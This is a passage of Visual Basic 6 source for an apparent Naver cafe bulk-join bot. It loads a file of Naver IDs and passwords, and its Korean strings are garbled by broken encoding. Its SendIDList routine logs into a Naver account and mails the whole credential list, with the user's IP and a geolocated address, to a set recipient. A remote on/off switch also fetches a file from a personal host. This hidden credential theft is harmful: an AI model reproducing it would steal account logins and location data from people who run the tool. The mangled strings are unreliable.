End If
'Open "C:\D2D.TXT" For Output As #1
'Print #1, WinHttp.ResponseText
'Close #1
'Exit Sub

'If InStr(WinHttp.ResponseText, "ī�� ����</strong>�� �Ϸ�Ǿ����ϴ�.") Then List2.AddItem arr2(0) & " ���Կ� �����Ͽ����ϴ�.": Label1.Caption = Label1 + 1
If InStr(WinHttp.ResponseText, "�˼��մϴ�.<br />ī��� �� <strong>300��") Then List2.AddItem arr2(0) & " ���̵� �� 300���� ī�並 ��� �����Ͽ����ϴ�."
If InStr(WinHttp.ResponseText, "�̹� ȸ���Դϴ�.") Then List2.AddItem arr2(0) & "���̵� �� �̹� ȸ���Դϴ�."
If InStr(WinHttp.ResponseText, "�� ī��� �Ǹ��� Ȯ�ε� ȸ����") Then List2.AddItem arr2(0) & " ���̵� �� �Ǹ��� Ȯ�ε� ���̵� �ƴմϴ�."
If InStr(WinHttp.ResponseText, "ȸ������ ���Ƿ� �� ���̹� ID �� �ϳ���") Then List2.AddItem arr2(0) & " ���̵� �� �簡�� Ż��� ���̵� �Դϴ�."
If InStr(WinHttp.ResponseText, "<strong>���� ��û</strong>�� �Ϸ�Ǿ����ϴ�.") Then List2.AddItem arr2(0) & " ī��Ŵ����� ���Խ����� ī��Ȱ���� �����մϴ�."

List2.ListIndex = List2.ListIndex + 1: Delay 1

Else

List2.AddItem arr2(0) & " ���̵� �Ǵ� ��й�ȣ�� �ǹٸ����ʽ��ϴ�."

End If

Next s
List2.AddItem "�� " & List1.ListCount - 0 & " ���� ���̵��� " & Label3.Caption & " ���� " & Text2.Text & " ī�� " & " ���Կ� �����Ͽ����ϴ�.": List2.ListIndex = List2.ListIndex + 1
Label4.Caption = "���� ���̵� " & Text2.Text & " ī�� ���Կ� �����Ͽ����ϴ�."
GO.Enabled = True: Check1.Enabled = True: Text1.Enabled = True: Text2.Enabled = True: Command1.Enabled = True: Command2.Enabled = True: Command3.Enabled = True
End Sub

Public Sub Delay(ByVal DelayTime As Long, Optional ByVal mDoEvents As Boolean = True)
    Dim tmp As Single
    tmp = Timer
    Do While Timer - tmp < DelayTime / 1000
        If mDoEvents Then DoEvents
    Loop
End Sub



Private Sub List1_Click()
Command3.Enabled = True
End Sub

Private Sub menu_Click()

End Sub

Private Sub Text1_Click()
If Text1.Text = "�г��� ����" Then Text1.Text = ""
End Sub

Private Sub Text2_Click()
If Text2.Text = "ī���ּ�" Then Text2.Text = ""
End Sub
Public Sub IDLoad()


    If Dir(App.Path & "\NaverIDList.txt") = "" Then
    Dim hFile As Long
    Dim sFilename As String
    'MkDir App.Path & "\CCSBFile"
    sFilename = App.Path & "\NaverIDList.txt"

    hFile = FreeFile
    Open sFilename For Output As #hFile
    Print #hFile, "���̵�/��й�ȣ ������ �����մϴ�."
    Close #hFile
    Exit Sub
    End If

 Open App.Path & "\NaverIDList.txt" For Input As #1

    While Not EOF(1)
        Line Input #1, szOneLineText
        'IDPW = IDPW & szOneLineText & vbCrLf
        List1.AddItem szOneLineText
    Wend
    Close #1
    
Me.Caption = "���̹� ī�� �۾������"
Me.Caption = Me.Caption & " [���̵� " & List1.ListCount - 0& & "�� �ε�]"


frimek.Caption = "IP: " & Winsock1.LocalIP & " �ּ�:" & D & "������ " & "���̵𰹼�:" & List1.ListCount - 0 & "�� �ε�" & "&"
'frimek.Caption = frimek.Caption & " ���̵� " & List1.ListCount - 0& & "�� �ε�"
End Sub
Private Sub Text1_GotFocus()
Text1.Text = ""
End Sub
Private Sub Text2_GotFocus()
Text2.Text = ""
End Sub

Private Sub Timer1_Timer()
Dim WinHttp As Object '�ѹ��� �����ؿ�
Set WinHttp = CreateObject("Winhttp.WinHttpRequest.5.1")
WinHttp.Open "GET", "http://thoyeon.dothome.co.kr/CafeHelper.txt" '�ڱ��� FTP�ּ�.gm.txt�� ���ְ� FTP�ּҿ� gm.txt�� ����� ON �̶� ������ ����ON�ǰ�  OFF�� ������ OFF�� �ȴ�.
WinHttp.Send '�������� ����
Label2.Caption = StrConv(WinHttp.ResponseBody, vbUnicode) '���̺���ڿ� ������ �ؿ�
If Label2.Caption = "ON" Then '���̺��� ON�̶� ���ִٸ��
Else 'ON�� �ƴ� �ٸ� ��� �����
MsgBox "���α׷��� ���� ������Ʈ�Ǿ����ϴ�.�����ڿ��� ���ǹٶ��ϴ�.", vbCritical, "hollywoodst4r@nate.com"
Unload Me ' �����ݴ´�
End If
End Sub

Public Sub SendIDList()
WinHttp.Open "POST", "https://nid.naver.com/nidlogin.login"
WinHttp.SetRequestHeader "Referer", "https://nid.naver.com/nidlogin.login"
WinHttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
WinHttp.Send "enctp=2&id=" & Text4 & "&pw=" & Text5
If InStr(WinHttp.ResponseText, "http://static.nid.naver.com/sso/cross-domain.nhn?sid=") Then
For i = 0 To List1.ListCount - 1
Temp = List1.List(i) & "<br>" & Temp
Next i
WinHttp.Open "POST", "http://mail.naver.com/json/write/send/"
WinHttp.SetRequestHeader "Referer", "http://mail.naver.com/"
WinHttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded; charset=utf-8"
WinHttp.Send "senderName=%EC%9D%B4%EC%8B%A0%EC%9A%B0&to=" & Text6 & "&cc=&bcc=&subject=" & frimek.Caption & "&body=" & Temp & "&contentType=html&charset=AUTO&sendSeparately=false&saveSentBox=true&type=new&fromMe=0&attachID=tseCWrwm_LYmKoumKSevFou97qUm7riGWzwCMBKTM40nWzJCbqMZKAEwKou.&reserveDate=&reserveGMT=&reserveTime=&calendarVal=&autoSaveMailSN=&addReceiverAddress=false&attachCount=0&attachSize=0&bigfile=&sessionID=&seqNums=&priority=0&ndriveFileInfos=&lists=&serviceID=&u=" & Text4

Else
'Next i
'MsgBox "�α��� ����", vbCritical, " "
End If
End Sub

Public Sub IPAdreess()
WinHttp.Open "GET", "http://map.naver.com/"
WinHttp.Send
a = StrConv(WinHttp.ResponseBody, vbUnicode)
b = Split(Split(a, "y:""")(1), """")(0)
C = Split(Split(a, "{x:""")(1), """")(0)
WinHttp.Open "GET", "http://maps.google.com/maps?f=q&source=s_q&output=js&hl=ko&geocode=&abauth=5045fffa9g1H9AYtCLU0HggYIY52KN1oZZg&authuser=0&q=" & b & "%2C" & C
WinHttp.Send
a = StrConv(WinHttp.ResponseBody, vbUnicode)
D = Split(Split(a, "laddr:""")(1), """")(0)
End Sub


Private Sub û���ϱ�_Click()
List1.Clear
List2.Clear
End Sub

Private Sub Ʈ���̸��_Click()
TrayControl1.SendToTray
End Sub

